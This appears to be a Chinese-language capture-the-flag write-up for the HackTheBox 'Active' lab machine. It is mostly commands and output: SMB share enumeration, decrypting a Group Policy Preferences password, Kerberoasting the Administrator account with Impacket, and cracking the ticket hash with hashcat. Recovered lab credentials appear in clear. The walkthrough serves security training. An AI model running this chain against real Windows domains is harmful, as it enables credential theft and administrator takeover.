# Active

首先nmap扫描

```shell
PORT      STATE    SERVICE        VERSION
53/tcp    open     domain         Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2023-09-08 09:58:27Z)
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
705/tcp   filtered agentx
1028/tcp  filtered unknown
1718/tcp  filtered h323gatedisc
2041/tcp  filtered interbase
2107/tcp  filtered msmq-mgmt
3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
7777/tcp  filtered cbt
32773/tcp filtered sometimes-rpc9
49152/tcp open     msrpc          Microsoft Windows RPC
49153/tcp open     msrpc          Microsoft Windows RPC
49154/tcp open     msrpc          Microsoft Windows RPC
49155/tcp open     msrpc          Microsoft Windows RPC
49157/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc          Microsoft Windows RPC
49165/tcp open     msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/8%OT=53%CT=1%CU=44320%PV=Y%DS=2%DC=T%G=Y%TM=64FAF0B2
OS:%P=arm-apple-darwin21.6.0)SEQ(SP=FF%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=RD%TS=7)SEQ(SP=FD%GCD=1%ISR=106%TI=I
OS:%II=I%SS=S%TS=7)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M53
OS:9NW8ST11%O5=M539NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=N%Q=)ECN(R=N)T1
OS:(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O
OS:=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.003 days (since Fri Sep  8 17:56:18 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   210:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-09-08T09:59:57
|_  start_date: 2023-09-08T09:56:42

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   312.12 ms 10.10.14.1
2   312.45 ms 10.10.10.100

NSE: Script Post-scanning.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Read data files from: /opt/homebrew/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.98 seconds
           Raw packets sent: 1444 (67.380KB) | Rcvd: 1131 (50.002KB)

```

域环境，开了445。139是netbios-ssn，尝试用smbmap枚举可能的文件共享（这一步到底为什么？）：

```
18:26:24 › smbmap -H 10.10.10.100

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.100:445	Name: 10.10.10.100
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Replication                                       	READ ONLY
	SYSVOL                                            	NO ACCESS	Logon server share
	Users                                             	NO ACCESS

```

发现Replication可读，匿名访问一下，发现这是一个SYSVOL文件夹（https://blog.csdn.net/Fly_hps/article/details/80641585）

将文件下载下来，发现存在了配置文件Groups.xml：

```shell
smbclient //10.10.10.100/Replicatio
smb: \active.htb\> RECURSE ON
smb: \active.htb\> PROMPT OFF
smb: \active.htb\> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (1.4 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.9 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.7 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \active.htb\> exit

feng at fengs-MacBook-Pro.local in [~/ctftools/smbmap/smbmap]  on git:master ✗  cecf743 "Updated version"
18:46:52 › ls
DfsrPrivate Policies    __init__.py psutils     scripts     smbmap.py

feng at fengs-MacBook-Pro.local in [~/ctftools/smbmap/smbmap]  on git:master ✗  cecf743 "Updated version"
18:46:53 › cd Policies

feng at fengs-MacBook-Pro.local in [~/ctftools/smbmap/smbmap/Policies]  on git:master ✗  cecf743 "Updated version"
```

通过gpp-decrypt可以解密内容得到用户名和密码。

```shell
19:10:31 › python3.9 gpp-decrypt.py -f groups.xml

                               __                                __
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/
/___/  /_/    /_/                                /___/  /_/

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```

这时候得到了一个用户名和密码，可以继续去smbmap枚举：

```shell
19:25:57 › smbmap -H 10.10.10.100 -u SVC_TGS  -p GPPstillStandingStrong2k18 -d active.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.100:445	Name: 10.10.10.100
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	Replication                                       	READ ONLY
	SYSVOL                                            	READ ONLY	Logon server share
	Users                                             	READ ONLY

```

Users目录可访问，就可以进去/Users/SVC_TGS获得user.txt了。

```shell
19:28:51 › smbclient //10.10.10.100/Users -U 'active.htb\SVC_TGS'
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 22:39:20 2018
  ..                                 DR        0  Sat Jul 21 22:39:20 2018
  Administrator                       D        0  Mon Jul 16 18:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 13:06:44 2009
  Default                           DHR        0  Tue Jul 14 14:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 13:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 12:57:55 2009
  Public                             DR        0  Tue Jul 14 12:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 23:16:32 2018
ls
		5217023 blocks of size 4096. 279098 blocks available
smb: \> cd SVC_TGS
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 23:16:32 2018
  ..                                  D        0  Sat Jul 21 23:16:32 2018
  Contacts                            D        0  Sat Jul 21 23:14:11 2018
  Desktop                             D        0  Sat Jul 21 23:14:42 2018
  Downloads                           D        0  Sat Jul 21 23:14:23 2018
  Favorites                           D        0  Sat Jul 21 23:14:44 2018
  Links                               D        0  Sat Jul 21 23:14:57 2018
  My Documents                        D        0  Sat Jul 21 23:15:03 2018
  My Music                            D        0  Sat Jul 21 23:15:32 2018
  My Pictures                         D        0  Sat Jul 21 23:15:43 2018
  My Videos                           D        0  Sat Jul 21 23:15:53 2018
  Saved Games                         D        0  Sat Jul 21 23:16:12 2018
  Searches                            D        0  Sat Jul 21 23:16:24 2018

		5217023 blocks of size 4096. 279098 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 23:14:42 2018
  ..                                  D        0  Sat Jul 21 23:14:42 2018
  user.txt                           AR       34  Fri Sep  8 17:57:34 2023

		5217023 blocks of size 4096. 279098 blocks available
```



得到了一个用户名和密码后，利用Kerberoasting攻击：



```shell
20:46:39 › python3.10 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2023-09-08 17:57:45.977345



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7a42d28b040a2fb876484c2da4649660$633a0cfbcb2b99eda14c66d1f0212a093d1a21e40867b7fb3d1424888c981094267021da58b1e5050162939a982d0a4346c5953d777e40cb8c9c71f5450ae71cd8202bbcc09f9d1963d613274209cbee24ab9e104a2ee30166ca95f721e306c3cee2cb7f9f44d8c81edf9f322f8967de2ef0262824fbe85f22dac50966908ed001ac5db924a357e2a5cb2bd19d8269265483384249b8e414f8654c1f7d16d27f61998d82155fa56a7486822185a62ad8b2d059ea9226191be2bbbaf54710409a71c820c2b5141c4485924d8dddd8481395b981373b7cabbf76154723db802e73568b81f93a10e9dcab7e5dd9fbae47e6ab93e97d6b89b2f302d42fc8909a2f489477d2da32fe28f3d1cdde9a22e030a8b84f0d25e32c5bed2b9b38629aac58cbfb0ae1fe10afe369b32cc47b513901a9142c565f95ef129c20daf17fc00d194b15e832f51ef301b1ec2b2513cfa3dc55d2beb2e2b3a71b9a3e5d994c5f94214b1b341d6474598811a909d7bb1c95ce42efbf33a6ae9e8fb288d11e556dff20343a78e4d52f2a1d0d459ebd5f66d13b51eeb325b1917b9f1f1e09ebfbcf24eec8669a36d042b7e19f8f7210d44980fbd206d4b2f2cf3ed4a40815105cc95c5bbc10e2e5515e6dbf60e15e86d4ee97afbdfc4cdaf0001b6e821f11752b81cef3204ef128dfd23082270911e4df925f1106d54e7dabafd6a4e974098831f3590ab5853346edaf70a388714bb59e7e883b70c523cf96495eb8fd5c8aa1b04c27ee5f30eefdeb4068d7a561cd80175110bdfde6d683d382b24a576a747e874239c73814b5c8069983065407b15397f28adacfa98b6e557d7fcaf2036b5c4e0f9c33da10d512388c53463885008ed8a37209597d6801db535c7daf603d803d362c8ae3cd09cbdf5cae74c0b8c3a31e79a1f99d153bf230b52186e5ee517e640133f4e29889b92d0d592b1dde07e89f1efb3434c8d07bdba66b60cdec1e52cdf6d0034c76b3c7079fa6a96f79c9c6976f1230246808c192f39757c845427771be7c4fcd3f3466769c1320ff0deade3c78ecc8d65013af4d1a09eac711275ede3c333da1f204974b5a7bf691eedf49623ccc6aab90b273e37be5fc2eef3f3233d4afcd0d4bd06078332204cc189eede1b5dac4c25fc4b2b96090d53564c369fd3981089c933e105e765397361b73ba54f7761ce89f819ddae1ae20147d09dcaa45bba8463a22b16522eca2dc80c86362cd9933ed71a8e5a70616a22a4396

```





```shell
20:41:08 › hashcat -m 13100 hash.txt /Users/feng/many-ctf/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

* Device #2: Apple's OpenCL drivers (GPU) are known to be unreliable.
             You have been warned.

METAL API (Metal 263.8)
=======================
* Device #1: Apple M1 Pro, 10880/21845 MB, 14MCU

OpenCL API (OpenCL 1.2 (Apr 19 2022 18:44:44)) - Platform #1 [Apple]
====================================================================
* Device #2: Apple M1 Pro, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory required for this attack: 122 MB

Dictionary cache built:
* Filename..: /Users/feng/many-ctf/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$cb11c582d5786bca071d4eb83da5b00c$c3903377da34699812c12ad13c268fe6b2b3441380d3052dc99ad561e542fca65adfce21ed81f26f65f99bf12bda97ec61825c36e415a2cb0e8d69ce1bf3a9656ed9878d82496262fd82ff038e617145bfe0e9e47a1b9445d782da3ed0f43d5433e7ff2632d05a30fa1ba9f4bd42e7533f92f6d090ee511ecb6866f2e2cec0f244e843ec6a9b2315d61cfa0cb07e1904d1c49515b0cca7440f052cea2ac5d7798774191a45bbfcf31aa87144d961374d68d5b0cc7fa38683c1cfd9ce138a149245bb281d45538689cd81453d423cd1b2262bacd8c6a88a127b76d85676dfca41d537f11f954952c1390fe5ad4e46ce9d1dc392b1f853e63f543286068a0ab72681e6052baaa7508251d2b1d2c778e1efbbb18861872818edf5bba0e251fb26aafb1ccb62a0ca81e5fb7abd376a4aa6579770e23747ac2a45d9d573b694eec2ecfedfa2dc2ecf351d5fa23b2091315bbcfd9c323dc55b587d3660df58805d2e7650fee8cbd74a406c797b2747cf876d797dbb430d68975326f731629aef9ecf676eeca505b626aa94945b4b01516e140e31ac7c0d05930d3581b01fd6f5b3d774db9210cd74fa98825711627e3b4d28df65265e9685c43f1594453bfff5410834527182358f01e8e11697f170fc3706533787d300f5f19888cac44288b67c92c04015dcf6e31ccedd052411ff6dd9bc345ae5e31708d079a581976e7f6f56eb69a0b7192dab8f43c7b38edd01c0d95d103feedf54ae378cb55c88e6857c86f3a7402d41a6e18ec4c69352e8712ed682d707d304e5c8b78377fda568bae84fdc9dc6515b41d16ffe5538fa99427be68981ff0ec85e2fe4f9511a19bd5bf734409c4e62a962976ce81bab027ff7b36344fa57af7486bbd5ed954a0a09c6e7cbca6cef82ffd14393e4872d66be042d616da959e3f1f76f71364719d13e819491a39890b24d66a65ad7104d85eb932311c7ecfbc5fac643e46c82bca86c2a75495a42ab546ebaca783cc51b96da439a975f93f12f11767cb5fa320e8669587405f92a4e08fced3915a5f487dcb7b8fe19b45550fea50dd6490c19f0d640731469aa4052a62eb91eed3cf91d2f176c9072c55b3ec26fbe6d19b4c6e1a74381a362ddf9e1ba36d512b9595bfda4131146692982c5c9fc5a37fb97dbefafa7521e87947cc7b2fb83a4d027c478ae2395ba1dad22c71219b25d54f7c5dc6394599f28a3405b96ec90e4fdd1d78cb859bd22afa4f385c32922cdd22e084213:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...084213
Time.Started.....: Fri Sep  8 20:43:46 2023, (1 sec)
Time.Estimated...: Fri Sep  8 20:43:47 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/Users/feng/many-ctf/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17843.9 kH/s (10.56ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10551296/14344384 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10092544/14344384 (70.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: angella14 -> TUGGAB8
Hardware.Mon.SMC.: Fan0: 0%, Fan1: 0%
Hardware.Mon.#1..: Util: 65%

Started: Fri Sep  8 20:43:45 2023
Stopped: Fri Sep  8 20:43:48 2023

```



连上Administrator用户的smb共享文件夹Users，下载root.txt：

```shell
19:40:51 › smbclient //10.10.10.100/Users -U 'Administrator'
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 22:39:20 2018
  ..                                 DR        0  Sat Jul 21 22:39:20 2018
  Administrator                       D        0  Mon Jul 16 18:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 13:06:44 2009
  Default                           DHR        0  Tue Jul 14 14:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 13:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 12:57:55 2009
  Public                             DR        0  Tue Jul 14 12:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 23:16:32 2018

		5217023 blocks of size 4096. 278820 blocks available
smb: \> cd Administrator/Desktop
smb: \Administrator\Desktop\> ls
  .                                  DR        0  Fri Jan 22 00:49:47 2021
  ..                                 DR        0  Fri Jan 22 00:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 21:50:10 2018
  root.txt                           AR       34  Fri Sep  8 17:57:34 2023

		5217023 blocks of size 4096. 278820 blocks available
smb: \Administrator\Desktop\> lcd /Users/feng/github/CTF/Web/渗透/hackthebox/Active
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Administrator\Desktop\> SMBecho failed (NT_STATUS_IO_TIMEOUT). The connection is disconnected now
```

